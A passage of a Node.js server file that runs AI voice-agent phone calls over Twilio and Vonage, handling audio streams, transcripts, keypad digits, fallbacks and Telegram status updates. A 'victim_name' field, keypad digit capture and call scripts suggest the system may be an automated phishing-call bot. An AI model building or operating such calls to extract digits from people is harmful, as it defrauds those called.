    clearCallEndLock(callSid);
    clearSilenceTimer(callSid);
    sttFallbackCalls.delete(callSid);
    streamTimeoutCalls.delete(callSid);
    clearVoiceAgentRuntime(callSid);
    clearKeypadCallState(callSid);
    if (digitService) {
      digitService.clearCallState(callSid);
    }
    const activeSession = activeCalls.get(callSid);
    if (activeSession?.startTime) {
      await handleCallEnd(callSid, activeSession.startTime);
    }
    activeCalls.delete(callSid);
    webhookService.addLiveEvent(callSid, `🔌 Voice agent stream ${reason}`, {
      force: true,
    });
  };

  activeCalls.set(callSid, {
    startTime: new Date(),
    callConfig,
    functionSystem,
    voiceAgent: true,
    interactionCount: 0,
  });
  setVoiceAgentRuntimeProvider(callSid, "vonage");
  setVoiceAgentPhase(callSid, "connected");
  clearKeypadCallState(callSid);
  scheduleSilenceTimer(callSid);

  if (db?.updateCallState) {
    await db
      .updateCallState(callSid, "voice_agent_connected", {
        at: new Date().toISOString(),
        provider: "vonage",
        source: "voice_agent",
        vonage_uuid: vonageUuid || callConfig?.provider_metadata?.vonage_uuid || null,
        stream_audio_encoding: vonageAudioSpec.sttEncoding,
        stream_audio_sample_rate: vonageAudioSpec.sampleRate,
      })
      .catch(() => {});
  }

  bridge.on("audio", (base64Audio) => {
    if (!base64Audio) return;
    try {
      markVoiceAgentAgentResponsive(callSid, "agent_speaking");
      const buffer = Buffer.from(base64Audio, "base64");
      ws.send(buffer);
      const level = estimateAudioLevelFromBase64(base64Audio);
      webhookService
        .setLiveCallPhase(callSid, "agent_speaking", { level })
        .catch(() => {});
      scheduleSpeechTicksFromAudio(callSid, "agent_speaking", base64Audio);
    } catch (error) {
      console.error(
        `Vonage voice agent audio send error: ${formatVoiceAgentErrorForLog(error)}`,
      );
    }
  });

  bridge.on("conversationText", async ({ role, text }) => {
    if (!callSid || !text) return;
    const speaker = role === "ai" ? "ai" : "user";
    const consoleRole = speaker === "ai" ? "agent" : "user";
    webhookService.recordTranscriptTurn(callSid, consoleRole, text);
    if (speaker === "user") {
      setVoiceAgentPhase(callSid, "user_speaking");
      webhookService.setLiveCallPhase(callSid, "user_speaking").catch(() => {});
    } else {
      setVoiceAgentPhase(callSid, "agent_responding");
      webhookService
        .setLiveCallPhase(callSid, "agent_responding")
        .catch(() => {});
    }

    try {
      await db.addTranscript({
        call_sid: callSid,
        speaker,
        message: text,
        interaction_count: interactionCount,
        personality_used: "voice_agent",
      });
      await db.updateCallState(callSid, `${speaker}_spoke`, {
        message: text,
        interaction_count: interactionCount,
        source: "voice_agent",
        provider: "vonage",
      });
    } catch (error) {
      console.error(
        `Vonage voice agent transcript save error: ${formatVoiceAgentErrorForLog(error)}`,
      );
    }

    if (speaker === "user") {
      interactionCount += 1;
      const session = activeCalls.get(callSid);
      if (session) {
        session.interactionCount = interactionCount;
      }
    }
  });

  bridge.on("functionCallRequest", async (request) => {
    const functionName = request?.name;
    if (!functionName) return;
    if (request?.clientSide === false) {
      return;
    }
    let args = request?.arguments || {};
    if (typeof args === "string") {
      try {
        args = JSON.parse(args);
      } catch (_) {
        args = {};
      }
    }

    let responsePayload;
    try {
      responsePayload = await executeVoiceAgentFunctionWithGuard(
        callSid,
        functionSystem,
        functionName,
        args || {},
      );
    } catch (error) {
      responsePayload = { error: error.message || "Function failed" };
      webhookService.addLiveEvent(
        callSid,
        `⚠️ Function error: ${functionName}`,
        { force: true },
      );
    }
    bridge.sendFunctionResponse(request?.id, responsePayload, functionName);
  });

  bridge.on("event", (event) => {
    if (!callSid) return;
    const type = String(event?.type || event?.event || "").toLowerCase();
    if (!type) return;
    if (type.includes("userstartedspeaking")) {
      clearSpeechTicks(callSid);
      setVoiceAgentPhase(callSid, "interrupted");
      webhookService.setLiveCallPhase(callSid, "interrupted").catch(() => {});
      armVoiceAgentTurnWatchdog(callSid, async ({ timeoutMs, timeoutCount }) => {
        webhookService.addLiveEvent(
          callSid,
          `⚠️ Voice agent response timeout (${timeoutMs}ms, count=${timeoutCount})`,
          { force: true },
        );
        db
          ?.addCallMetric?.(callSid, "voice_agent_turn_timeout_ms", timeoutMs, {
            provider: "vonage",
            timeout_count: timeoutCount,
          })
          .catch(() => {});
        db
          ?.updateCallState?.(callSid, "voice_agent_turn_timeout", {
            at: new Date().toISOString(),
            provider: "vonage",
            timeout_ms: timeoutMs,
            timeout_count: timeoutCount,
          })
          .catch(() => {});
      });
      return;
    }
    if (type.includes("agentthinking")) {
      markVoiceAgentAgentResponsive(callSid, "agent_responding");
      webhookService
        .setLiveCallPhase(callSid, "agent_responding")
        .catch(() => {});
      return;
    }
    if (type.includes("agentstartedspeaking")) {
      markVoiceAgentAgentResponsive(callSid, "agent_speaking");
      webhookService.setLiveCallPhase(callSid, "agent_speaking").catch(() => {});
    }
  });

  bridge.on("error", (error) => {
    console.error(
      `Vonage voice agent bridge error: ${formatVoiceAgentErrorForLog(error)}`,
    );
    webhookService.addLiveEvent(
      callSid,
      `⚠️ Voice agent error: ${error.message || "unknown error"}`,
      { force: true },
    );
  });

  ws.on("message", (data) => {
    if (!data) return;
    if (Buffer.isBuffer(data)) {
      markStreamMediaSeen(callSid);
      streamLastMediaAt.set(callSid, Date.now());
      bridge.sendTwilioAudio(data.toString("base64"));
      return;
    }
    const text = data.toString();
    let parsed;
    try {
      parsed = JSON.parse(text);
    } catch {
      return;
    }
    const wsDigits = getVonageDtmfDigits(parsed || {});
    if (wsDigits) {
      webhookService.addLiveEvent(callSid, `🔢 Keypad: ${wsDigits}`, {
        force: true,
      });
      bridge.injectUserMessage(`Caller pressed keypad digits: ${wsDigits}`);
      return;
    }
    if (parsed?.event === "websocket:closed") {
      ws.close();
    }
  });

  ws.on("error", (error) => {
    console.error(
      `Vonage voice agent websocket error: ${formatVoiceAgentErrorForLog(error)}`,
    );
  });

  ws.on("close", async () => {
    await cleanup("closed");
  });

  webhookService.addLiveEvent(callSid, "🤖 Voice agent connected", {
    force: true,
  });
  return { started: true };
}

async function handleVoiceAgentWebSocket(ws, req) {
  let streamSid = null;
  let callSid = null;
  let callStartTime = null;
  let callConfig = null;
  let functionSystem = null;
  let interactionCount = 0;
  let streamAuthOk = false;
  let cleanedUp = false;

  const bridge = new VoiceAgentBridge({
    apiKey: config.deepgram.apiKey,
    endpoint: config.deepgram?.voiceAgent?.endpoint,
    keepAliveMs: config.deepgram?.voiceAgent?.keepAliveMs,
    listenModel: config.deepgram?.voiceAgent?.listen?.model,
    thinkProviderType: config.deepgram?.voiceAgent?.think?.providerType,
    thinkModel: config.deepgram?.voiceAgent?.think?.model,
    speakModel: config.deepgram?.voiceAgent?.speak?.model,
  });

  const streamService = new StreamService(ws, {
    audioTickIntervalMs: liveConsoleAudioTickMs,
  });

  const cleanup = async (reason = "closed") => {
    if (cleanedUp) return;
    cleanedUp = true;

    try {
      await bridge.close();
    } catch (_) {}

    if (callSid) {
      clearFirstMediaWatchdog(callSid);
      streamFirstMediaSeen.delete(callSid);
      streamStartTimes.delete(callSid);
      if (
        activeStreamConnections.get(callSid)?.streamSid ===
        (streamSid || activeStreamConnections.get(callSid)?.streamSid)
      ) {
        activeStreamConnections.delete(callSid);
      }
      if (pendingStreams.has(callSid)) {
        clearTimeout(pendingStreams.get(callSid));
        pendingStreams.delete(callSid);
      }
      clearSpeechTicks(callSid);
      clearGptQueue(callSid);
      clearNormalFlowState(callSid);
      clearCallEndLock(callSid);
      clearSilenceTimer(callSid);
      sttFallbackCalls.delete(callSid);
      streamTimeoutCalls.delete(callSid);
      clearVoiceAgentRuntime(callSid);
      if (digitService) {
        digitService.clearCallState(callSid);
      }
      const activeSession = activeCalls.get(callSid);
      if (activeSession?.startTime) {
        await handleCallEnd(callSid, activeSession.startTime);
      }
      activeCalls.delete(callSid);
      streamAuthBypass.delete(callSid);
      streamStartSeen.delete(callSid);
      webhookService.addLiveEvent(
        callSid,
        `🔌 Voice agent stream ${reason}`,
        { force: true },
      );
    }
  };

  bridge.on("audio", (base64Audio) => {
    if (!base64Audio) return;
    markVoiceAgentAgentResponsive(callSid, "agent_speaking");
    streamService.buffer(null, base64Audio);
    if (callSid) {
      webhookService
        .setLiveCallPhase(callSid, "agent_speaking")
        .catch(() => {});
    }
  });

  bridge.on("conversationText", async ({ role, text }) => {
    if (!callSid || !text) return;
    const speaker = role === "ai" ? "ai" : "user";
    const consoleRole = speaker === "ai" ? "agent" : "user";
    webhookService.recordTranscriptTurn(callSid, consoleRole, text);
    if (speaker === "user") {
      setVoiceAgentPhase(callSid, "user_speaking");
      webhookService.setLiveCallPhase(callSid, "user_speaking").catch(() => {});
    } else {
      setVoiceAgentPhase(callSid, "agent_responding");
      webhookService
        .setLiveCallPhase(callSid, "agent_responding")
        .catch(() => {});
    }

    try {
      await db.addTranscript({
        call_sid: callSid,
        speaker,
        message: text,
        interaction_count: interactionCount,
        personality_used: "voice_agent",
      });
      await db.updateCallState(callSid, `${speaker}_spoke`, {
        message: text,
        interaction_count: interactionCount,
        source: "voice_agent",
      });
    } catch (error) {
      console.error(
        `Voice agent transcript save error: ${formatVoiceAgentErrorForLog(error)}`,
      );
    }
    if (speaker === "user") {
      interactionCount += 1;
      const session = activeCalls.get(callSid);
      if (session) {
        session.interactionCount = interactionCount;
      }
    }
  });

  bridge.on("functionCallRequest", async (request) => {
    const functionName = request?.name;
    if (!functionName) return;
    if (request?.clientSide === false) {
      return;
    }
    let args = request?.arguments || {};
    if (typeof args === "string") {
      try {
        args = JSON.parse(args);
      } catch (_) {
        args = {};
      }
    }

    let responsePayload;
    try {
      responsePayload = await executeVoiceAgentFunctionWithGuard(
        callSid,
        functionSystem,
        functionName,
        args || {},
      );
    } catch (error) {
      responsePayload = { error: error.message || "Function failed" };
      if (callSid) {
        webhookService.addLiveEvent(
          callSid,
          `⚠️ Function error: ${functionName}`,
          { force: true },
        );
      }
    }
    bridge.sendFunctionResponse(request?.id, responsePayload, functionName);
  });

  bridge.on("event", (event) => {
    if (!callSid) return;
    const type = String(event?.type || event?.event || "").toLowerCase();
    if (!type) return;
    if (type.includes("userstartedspeaking")) {
      clearSpeechTicks(callSid);
      setVoiceAgentPhase(callSid, "interrupted");
      webhookService.setLiveCallPhase(callSid, "interrupted").catch(() => {});
      if (streamSid && ws?.readyState === 1) {
        try {
          ws.send(
            JSON.stringify({
              streamSid,
              event: "clear",
            }),
          );
        } catch (_) {}
      }
      armVoiceAgentTurnWatchdog(callSid, async ({ timeoutMs, timeoutCount }) => {
        webhookService.addLiveEvent(
          callSid,
          `⚠️ Voice agent response timeout (${timeoutMs}ms, count=${timeoutCount})`,
          { force: true },
        );
        db
          ?.addCallMetric?.(callSid, "voice_agent_turn_timeout_ms", timeoutMs, {
            provider: "twilio",
            timeout_count: timeoutCount,
          })
          .catch(() => {});
        db
          ?.updateCallState?.(callSid, "voice_agent_turn_timeout", {
            at: new Date().toISOString(),
            provider: "twilio",
            timeout_ms: timeoutMs,
            timeout_count: timeoutCount,
          })
          .catch(() => {});

        const runtimeCfg = getVoiceAgentRuntimeConfig();
        if (
          !runtimeCfg.timeoutFallbackThreshold ||
          runtimeCfg.timeoutFallbackThreshold <= 0 ||
          timeoutCount < runtimeCfg.timeoutFallbackThreshold
        ) {
          return;
        }
        const runtimeState = getOrCreateVoiceAgentRuntimeState(callSid);
        if (runtimeState?.fallbackRequested) {
          return;
        }
        if (runtimeState) {
          runtimeState.fallbackRequested = true;
        }
        try {
          const fallback = await requestVoiceAgentFallback(
            callSid,
            req,
            "turn_timeout",
          );
          await db
            ?.updateCallState?.(callSid, "voice_agent_timeout_fallback_redirected", {
              at: new Date().toISOString(),
              timeout_count: timeoutCount,
              redirect_url: fallback?.redirectUrl || null,
            })
            .catch(() => {});
          await cleanup("timeout_fallback_redirect");
          try {
            ws.close(4002, "Voice agent timeout fallback");
          } catch (_) {}
        } catch (fallbackError) {
          if (runtimeState) {
            runtimeState.fallbackRequested = false;
          }
          console.error(
            `Voice agent timeout fallback failed: ${formatVoiceAgentErrorForLog(fallbackError)}`,
          );
        }
      });
      return;
    }
    if (type.includes("agentthinking")) {
      markVoiceAgentAgentResponsive(callSid, "agent_responding");
      webhookService
        .setLiveCallPhase(callSid, "agent_responding")
        .catch(() => {});
      return;
    }
    if (type.includes("agentstartedspeaking")) {
      markVoiceAgentAgentResponsive(callSid, "agent_speaking");
      webhookService.setLiveCallPhase(callSid, "agent_speaking").catch(() => {});
    }
  });

  bridge.on("error", (error) => {
    console.error(`Voice agent bridge error: ${formatVoiceAgentErrorForLog(error)}`);
    if (callSid) {
      webhookService.addLiveEvent(
        callSid,
        `⚠️ Voice agent error: ${error.message || "unknown error"}`,
        { force: true },
      );
    }
  });

  ws.on("message", async (data) => {
    let msg;
    try {
      msg = JSON.parse(data);
    } catch (_) {
      return;
    }

    const event = msg?.event;
    if (event === "start") {
      streamSid = msg.start?.streamSid;
      callSid = msg.start?.callSid;
      callStartTime = new Date();
      streamStartTimes.set(callSid, Date.now());
      if (!callSid) {
        ws.close();
        return;
      }

      const customParams = msg.start?.customParameters || {};
      const authResult = verifyStreamAuth(callSid, req, customParams);
      if (!authResult.ok) {
        ws.close();
        return;
      }
      streamAuthOk = authResult.ok || authResult.skipped;

      const priorStreamSid = streamStartSeen.get(callSid);
      if (priorStreamSid && priorStreamSid === streamSid) {
        return;
      }
      streamStartSeen.set(callSid, streamSid || "unknown");

      const existingConnection = activeStreamConnections.get(callSid);
      if (
        existingConnection &&
        existingConnection.ws !== ws &&
        existingConnection.ws.readyState === 1
      ) {
        try {
          existingConnection.ws.close(4000, "Replaced by new stream");
        } catch (_) {}
      }
      activeStreamConnections.set(callSid, {
        ws,
        streamSid: streamSid || null,
        connectedAt: new Date().toISOString(),
      });

      streamService.setStreamSid(streamSid);

      const streamParams = resolveStreamAuthParams(req, customParams);
      const fromValue =
        streamParams.from ||
        streamParams.From ||
        customParams.from ||
        customParams.From;
      const toValue =
        streamParams.to ||
        streamParams.To ||
        customParams.to ||
        customParams.To;
      const directionHint =
        streamParams.direction ||
        customParams.direction ||
        callDirections.get(callSid);
      const hasDirection = Boolean(String(directionHint || "").trim());
      const isOutbound = hasDirection
        ? isOutboundTwilioDirection(directionHint)
        : false;
      const defaultInbound = callConfigurations.get(callSid)?.inbound;
      const isInbound = hasDirection
        ? !isOutbound
        : typeof defaultInbound === "boolean"
          ? defaultInbound
          : true;

      callConfig = callConfigurations.get(callSid);
      functionSystem = callFunctionSystems.get(callSid);
      if (!callConfig && isOutbound) {
        const hydrated = await hydrateCallConfigFromDb(callSid);
        callConfig = hydrated?.callConfig || callConfig;
        functionSystem = hydrated?.functionSystem || functionSystem;
      }
      if (!callConfig || !functionSystem) {
        const setup = ensureCallSetup(
          callSid,
          {
            From: fromValue,
            To: toValue,
          },
          {
            provider: "twilio",
            inbound: isInbound,
          },
        );
        callConfig = setup.callConfig || callConfig;
        functionSystem = setup.functionSystem || functionSystem;
      }
      if (callConfig && hasDirection) {
        callConfig.inbound = isInbound;
        callConfigurations.set(callSid, callConfig);
      }
      if (callSid && hasDirection) {
        callDirections.set(callSid, isInbound ? "inbound" : "outbound");
      }

      await ensureCallRecord(
        callSid,
        {
          From: fromValue,
          To: toValue,
        },
        "ws_start_voice_agent",
        {
          provider: "twilio",
          inbound: isInbound,
        },
      );

      streamFirstMediaSeen.delete(callSid);
      scheduleFirstMediaWatchdog(
        callSid,
        resolveHost(req) || config.server?.hostname,
        callConfig,
      );

      try {
        await db.updateCallStatus(callSid, "started", {
          started_at: callStartTime.toISOString(),
        });
        await db.updateCallState(callSid, "stream_started", {
          stream_sid: streamSid,
          start_time: callStartTime.toISOString(),
          source: "voice_agent",
        });
      } catch (error) {
        console.error("Voice agent call start DB update error:", error);
      }

      activeCalls.set(callSid, {
        startTime: callStartTime,
        callConfig,
        functionSystem,
        voiceAgent: true,
        interactionCount: 0,
      });
      setVoiceAgentRuntimeProvider(callSid, "twilio");
      setVoiceAgentPhase(callSid, "connected");

      const voiceAgentFunctions = buildVoiceAgentFunctions(functionSystem);
      try {
        await bridge.connect({
          callSid,
          prompt: callConfig?.prompt,
          firstMessage: callConfig?.first_message,
          voiceModel: resolveVoiceModel(callConfig),
          functions: voiceAgentFunctions,
        });
        webhookService.addLiveEvent(callSid, "🤖 Voice agent connected", {
          force: true,
        });
      } catch (error) {
        console.error(
          `Voice agent connect failed, falling back: ${formatVoiceAgentErrorForLog(error)}`,
        );
        webhookService.addLiveEvent(
          callSid,
          "⚠️ Voice agent unavailable. Switching to legacy audio pipeline…",
          { force: true },
        );
        try {
          await db.updateCallState(callSid, "voice_agent_connect_failed", {
            error: error.message || "voice_agent_connect_failed",
            at: new Date().toISOString(),
          });
        } catch (_) {}

        let fallbackResult = null;
        try {
          fallbackResult = await requestVoiceAgentFallback(
            callSid,
            req,
            "connect_failed",
          );
          webhookService.addLiveEvent(
            callSid,
            "↩️ Redirecting call to legacy STT/TTS pipeline",
            { force: true },
          );
          await db.updateCallState(callSid, "voice_agent_fallback_redirected", {
            redirect_url: fallbackResult.redirectUrl,
            attempt: fallbackResult.attemptCount,
            at: new Date().toISOString(),
          }).catch(() => {});
        } catch (fallbackError) {
          console.error(
            `Voice agent fallback redirect failed: ${formatVoiceAgentErrorForLog(fallbackError)}`,
          );
          await db.updateCallState(callSid, "voice_agent_fallback_failed", {
            error: fallbackError.message || "fallback_redirect_failed",
            at: new Date().toISOString(),
          }).catch(() => {});
          throw fallbackError;
        }

        await cleanup("fallback_redirect");
        try {
          ws.close(4001, "Voice agent fallback");
        } catch (_) {}
      }
      return;
    }

    if (!streamAuthOk) {
      return;
    }

    if (event === "media") {
      if (!callSid) return;
      const now = Date.now();
      streamLastMediaAt.set(callSid, now);
      markStreamMediaSeen(callSid);
      bridge.sendTwilioAudio(msg?.media?.payload);
      return;
    }

    if (event === "dtmf") {
      const digits = msg?.dtmf?.digits || msg?.dtmf?.digit || "";
      if (!digits || !callSid) return;
      webhookService.addLiveEvent(callSid, `🔢 Keypad: ${digits}`, {
        force: true,
      });
      bridge.injectUserMessage(`Caller pressed keypad digits: ${digits}`);
      return;
    }

    if (event === "stop") {
      await cleanup("stopped");
    }
  });

  ws.on("error", (error) => {
    console.error(
      `Voice agent websocket error: ${formatVoiceAgentErrorForLog(error)}`,
    );
  });

  ws.on("close", async () => {
    await cleanup("closed");
  });
}

// Enhanced WebSocket connection handler with dynamic functions
app.ws("/connection", (ws, req) => {
  const ua = req?.headers?.["user-agent"] || "unknown-ua";
  const host = req?.headers?.host || "unknown-host";
  console.log(`New WebSocket connection established (host=${host}, ua=${ua})`);
  const wsParams = resolveStreamAuthParams(req);
  const voiceAgentMode = resolveVoiceAgentExecutionMode();
  const forceLegacyVoice = ["1", "true", "yes"].includes(
    String(
      wsParams?.va_legacy ||
        wsParams?.voice_agent_fallback ||
        wsParams?.legacy ||
        "",
    )
      .toLowerCase()
      .trim(),
  );

  if (voiceAgentMode.enabled && !forceLegacyVoice) {
    handleVoiceAgentWebSocket(ws, req).catch((error) => {
      console.error("Voice agent websocket handler failed:", error);
      try {
        ws.close();
      } catch (_) {}
    });
    return;
  }
  if (forceLegacyVoice) {
    console.log("Voice agent bypass requested; using legacy pipeline");
  } else if (voiceAgentMode.requested && !voiceAgentMode.enabled) {
    console.log(
      `Voice agent requested but unavailable (${voiceAgentMode.reason}); using legacy STT+GPT+TTS pipeline`,
    );
  } else if (!voiceAgentMode.requested) {
    console.log("Voice agent disabled by config; using legacy STT+GPT+TTS pipeline");
  }

  try {
    ws.on("error", (error) => {
      console.error("WebSocket error:", error);
    });
    ws.on("close", (code, reason) => {
      console.warn(
        `WebSocket closed code=${code} reason=${reason?.toString() || ""}`,
      );
    });

    let streamSid;
    let callSid;
    let callConfig = null;
    let callStartTime = null;
    let functionSystem = null;

    let gptErrorCount = 0;
    let gptService;
    const streamService = new StreamService(ws, {
      audioTickIntervalMs: liveConsoleAudioTickMs,
    });
    const transcriptionService = new TranscriptionService();
    const ttsService = new TextToSpeechService({});
    // Prewarm TTS to reduce first-synthesis delay (silent)
    ttsService
      .generate(
        { partialResponseIndex: null, partialResponse: "warming up" },
        -1,
        { silent: true },
      )
      .catch(() => {});

    let marks = [];
    let interactionCount = 0;
    let isInitialized = false;
    let streamAuthOk = false;

    const handleSttFailure = async (tag, error) => {
      if (!callSid) return;
      console.error(
        `STT failure (${tag}) for ${callSid}`,
        error?.message || error || "",
      );
      const nextCount = (sttFailureCounts.get(callSid) || 0) + 1;
      sttFailureCounts.set(callSid, nextCount);
      db?.addCallMetric?.(callSid, "stt_failure", nextCount, { tag }).catch(
        () => {},
      );
      const threshold = Number(config.callSlo?.sttFailureThreshold);
      if (
        Number.isFinite(threshold) &&
        threshold > 0 &&
        nextCount >= threshold
      ) {
        db?.logServiceHealth?.("call_slo", "degraded", {
          call_sid: callSid,
          metric: "stt_failure_count",
          value: nextCount,
          threshold,
        }).catch(() => {});
      }
      const activeSession = activeCalls.get(callSid);
      await activateDtmfFallback(
        callSid,
        callConfig,
        gptService,
        activeSession?.interactionCount || interactionCount,
        tag,
      );
    };

    transcriptionService.on("error", (error) => {
      handleSttFailure("stt_error", error);
    });
    transcriptionService.on("close", () => {
      handleSttFailure("stt_closed");
    });

    ws.on("message", async function message(data) {
      try {
        const msg = JSON.parse(data);
        const event = msg.event;

        if (event === "start") {
          streamSid = msg.start.streamSid;
          callSid = msg.start.callSid;
          callStartTime = new Date();
          streamStartTimes.set(callSid, Date.now());
          if (!callSid) {
            console.warn("WebSocket start missing CallSid");
            ws.close();
            return;
          }
          const customParams = msg.start?.customParameters || {};
          const authResult = verifyStreamAuth(callSid, req, customParams);
          if (!authResult.ok) {
            console.warn("Stream auth failed", {
              callSid,
              streamSid,
              reason: authResult.reason,
            });
            db.updateCallState(callSid, "stream_auth_failed", {
              reason: authResult.reason,
              stream_sid: streamSid || null,
              at: new Date().toISOString(),
            }).catch(() => {});
            ws.close();
            return;
          }
          streamAuthOk = authResult.ok || authResult.skipped;
          const priorStreamSid = streamStartSeen.get(callSid);
          if (priorStreamSid && priorStreamSid === streamSid) {
            console.log(
              `Duplicate stream start ignored for ${callSid} (${streamSid})`,
            );
            return;
          }
          streamStartSeen.set(callSid, streamSid || "unknown");
          const existingConnection = activeStreamConnections.get(callSid);
          if (
            existingConnection &&
            existingConnection.ws !== ws &&
            existingConnection.ws.readyState === 1
          ) {
            console.warn(`Replacing existing stream for ${callSid}`);
            try {
              existingConnection.ws.close(4000, "Replaced by new stream");
            } catch {}
            db.updateCallState(callSid, "stream_replaced", {
              at: new Date().toISOString(),
              previous_stream_sid: existingConnection.streamSid || null,
              new_stream_sid: streamSid || null,
            }).catch(() => {});
          }
          activeStreamConnections.set(callSid, {
            ws,
            streamSid: streamSid || null,
            connectedAt: new Date().toISOString(),
          });
          if (digitService?.isFallbackActive?.(callSid)) {
            digitService.clearDigitFallbackState(callSid);
          }
          if (pendingStreams.has(callSid)) {
            clearTimeout(pendingStreams.get(callSid));
            pendingStreams.delete(callSid);
          }

          console.log(`Adaptive call started - SID: ${callSid}`);

          streamService.setStreamSid(streamSid);

          const streamParams = resolveStreamAuthParams(req, customParams);
          const fromValue =
            streamParams.from ||
            streamParams.From ||
            customParams.from ||
            customParams.From;
          const toValue =
            streamParams.to ||
            streamParams.To ||
            customParams.to ||
            customParams.To;
          const directionHint =
            streamParams.direction ||
            customParams.direction ||
            callDirections.get(callSid);
          const hasDirection = Boolean(String(directionHint || "").trim());
          const isOutbound = hasDirection
            ? isOutboundTwilioDirection(directionHint)
            : false;
          const defaultInbound = callConfigurations.get(callSid)?.inbound;
          const isInbound = hasDirection
            ? !isOutbound
            : typeof defaultInbound === "boolean"
              ? defaultInbound
              : true;

          callConfig = callConfigurations.get(callSid);
          functionSystem = callFunctionSystems.get(callSid);
          if (!callConfig && isOutbound) {
            const hydrated = await hydrateCallConfigFromDb(callSid);
            callConfig = hydrated?.callConfig || callConfig;
            functionSystem = hydrated?.functionSystem || functionSystem;
          }

          if (!callConfig || !functionSystem) {
            const setup = ensureCallSetup(
              callSid,
              {
                From: fromValue,
                To: toValue,
              },
              {
                provider: "twilio",
                inbound: isInbound,
              },
            );
            callConfig = setup.callConfig || callConfig;
            functionSystem = setup.functionSystem || functionSystem;
          }

          if (callConfig && hasDirection) {
            callConfig.inbound = isInbound;
            callConfigurations.set(callSid, callConfig);
          }
          if (callSid && hasDirection) {
            callDirections.set(callSid, isInbound ? "inbound" : "outbound");
          }
          await ensureCallRecord(
            callSid,
            {
              From: fromValue,
              To: toValue,
            },
            "ws_start",
            {
              provider: "twilio",
              inbound: isInbound,
            },
          );
          streamFirstMediaSeen.delete(callSid);
          scheduleFirstMediaWatchdog(callSid, host, callConfig);

          // Update database with enhanced tracking
          try {
            await db.updateCallStatus(callSid, "started", {
              started_at: callStartTime.toISOString(),
            });
            await db.updateCallState(callSid, "stream_started", {
              stream_sid: streamSid,
              start_time: callStartTime.toISOString(),
            });

            // Create webhook notification for stream start (internal tracking)
            const call = await db.getCall(callSid);
            if (call && call.user_chat_id) {
              await db.createEnhancedWebhookNotification(
                callSid,
                "call_stream_started",
                call.user_chat_id,
              );
            }
            if (callConfig?.inbound) {
              const chatId =
                call?.user_chat_id ||
                callConfig?.user_chat_id ||
                config.telegram?.adminChatId;
              if (chatId) {
                webhookService
                  .sendCallStatusUpdate(callSid, "answered", chatId, {
                    status_source: "stream",
                  })
                  .catch((err) =>
                    console.error("Inbound answered update error:", err),
                  );
              }
            }
          } catch (dbError) {
            console.error("Database error on call start:", dbError);
          }
          // Get call configuration and function system
          const resolvedVoiceModel = resolveVoiceModel(callConfig);
          if (resolvedVoiceModel) {
            ttsService.voiceModel = resolvedVoiceModel;
          }

          if (callConfig && functionSystem) {
            console.log(
              `Using adaptive configuration for ${functionSystem.context.industry} industry`,
            );
            console.log(
              `Available functions: ${Object.keys(functionSystem.implementations).join(", ")}`,
            );
            gptService = new EnhancedGptService(
              callConfig.prompt,
              callConfig.first_message,
            );
          } else {
            console.log(`Standard call detected: ${callSid}`);
            gptService = new EnhancedGptService();
          }

          gptService.setCallSid(callSid);
          gptService.setCustomerName(
            callConfig?.customer_name || callConfig?.victim_name,
          );
          gptService.setCallProfile(
            callConfig?.purpose || callConfig?.business_context?.purpose,
          );
          const intentLine = `Call intent: ${callConfig?.script || "general"} | purpose: ${callConfig?.purpose || "general"} | business: ${callConfig?.business_context?.business_id || callConfig?.business_id || "unspecified"}. Keep replies concise and on-task.`;
          gptService.setCallIntent(intentLine);
          if (callConfig) {
            await applyInitialDigitIntent(
              callSid,
              callConfig,
              gptService,
              interactionCount,
            );
          }
          configureCallTools(gptService, callSid, callConfig, functionSystem);

          let gptErrorCount = 0;

          // Set up GPT reply handler with personality tracking
          gptService.on("gptreply", async (gptReply, icount) => {
            gptErrorCount = 0;
            const activeSession = activeCalls.get(callSid);
            if (activeSession?.ending) {
              return;
            }
            const personalityInfo = gptReply.personalityInfo || {};
            console.log(
              `${personalityInfo.name || "Default"} Personality: ${gptReply.partialResponse.substring(0, 50)}...`,
            );
            webhookService.recordTranscriptTurn(
              callSid,
              "agent",
              gptReply.partialResponse,
            );
            webhookService
              .setLiveCallPhase(callSid, "agent_responding")
              .catch(() => {});

            // Save AI response to database with personality context
            try {
              await db.addTranscript({
                call_sid: callSid,
                speaker: "ai",
                message: gptReply.partialResponse,
                interaction_count: icount,
                personality_used: personalityInfo.name || "default",
                adaptation_data: JSON.stringify(
                  gptReply.adaptationHistory || [],
                ),
              });

              await db.updateCallState(callSid, "ai_responded", {
                message: gptReply.partialResponse,
                interaction_count: icount,
                personality: personalityInfo.name,
              });
            } catch (dbError) {
              console.error("Database error adding AI transcript:", dbError);
            }

            ttsService.generate(gptReply, icount);
            scheduleSilenceTimer(callSid);
          });

          gptService.on("stall", (fillerText) => {
            webhookService.addLiveEvent(callSid, "⏳ One moment…", {
              force: true,
            });
            try {
              ttsService.generate(
                {
                  partialResponse: fillerText,
                  personalityInfo: { name: "filler" },
                  adaptationHistory: [],
                },
                interactionCount,
              );
            } catch (err) {
              console.error("Filler TTS error:", err);
            }
          });

          gptService.on("gpterror", async (err) => {
            gptErrorCount += 1;
            const message = err?.message || "GPT error";
            webhookService.addLiveEvent(callSid, `⚠️ GPT error: ${message}`, {
              force: true,
            });
            if (gptErrorCount >= 2) {
              await speakAndEndCall(
                callSid,
                CALL_END_MESSAGES.error,
                "gpt_error",
              );
            }
          });

          // Listen for personality changes
          gptService.on("personalityChanged", async (changeData) => {
            console.log(
              `Personality adapted: ${changeData.from} → ${changeData.to}`,
            );
            console.log(`Reason: ${JSON.stringify(changeData.reason)}`.blue);

            // Log personality change to database
            try {
              await db.updateCallState(callSid, "personality_changed", {
                from: changeData.from,
                to: changeData.to,
                reason: changeData.reason,
                interaction_count: interactionCount,
              });
            } catch (dbError) {
              console.error(
                "Database error logging personality change:",
                dbError,
              );
            }
          });

          activeCalls.set(callSid, {
            startTime: callStartTime,
            transcripts: [],
            gptService,
            callConfig,
            functionSystem,
            personalityChanges: [],
            ttsService,
            interactionCount: 0,
          });

          const pendingDigitActions = popPendingDigitActions(callSid);
          const skipGreeting =
            callConfig?.initial_prompt_played === true ||
            pendingDigitActions.length > 0;

          // Initialize call with recording
          try {
            if (skipGreeting) {
              isInitialized = true;
              console.log(
                `Stream reconnected for ${callSid} (skipping greeting)`,
              );
              if (pendingDigitActions.length) {
                await handlePendingDigitActions(
                  callSid,
                  pendingDigitActions,
                  gptService,
                  interactionCount,
                );
              }
              startGroupedGather(callSid, callConfig, {
                preamble: "",
                gptService,
                interactionCount,
              });
            } else {
              await recordingService(ttsService, callSid);

              const initialExpectation = digitService?.getExpectation(callSid);
              const activePlan = digitService?.getPlan
                ? digitService.getPlan(callSid)
                : null;
